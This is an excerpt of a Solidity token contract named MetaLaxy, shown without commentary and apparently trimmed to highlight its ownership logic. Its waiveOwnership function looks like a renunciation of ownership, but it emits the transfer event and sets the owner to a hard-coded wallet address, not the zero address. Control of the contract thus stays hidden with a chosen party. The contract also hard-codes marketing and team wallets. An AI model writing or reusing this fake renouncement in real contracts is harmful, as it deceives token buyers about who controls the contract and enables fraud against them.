...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xA7cf7ed8B8ACF6E0B5257bCdC0d086529d95a46A));
        _owner = address(0xA7cf7ed8B8ACF6E0B5257bCdC0d086529d95a46A);
    }
...
contract MetaLaxy is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MetaLax";
    string private _symbol = "ML";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xfD94aC27C6Ce6bEd0d3CF91A39b0131B99Ea3C9B);
    address payable public teamWalletAddress = payable(0xF7e999453a5E70Eef7eEF4EbAd90B1D11926F889);
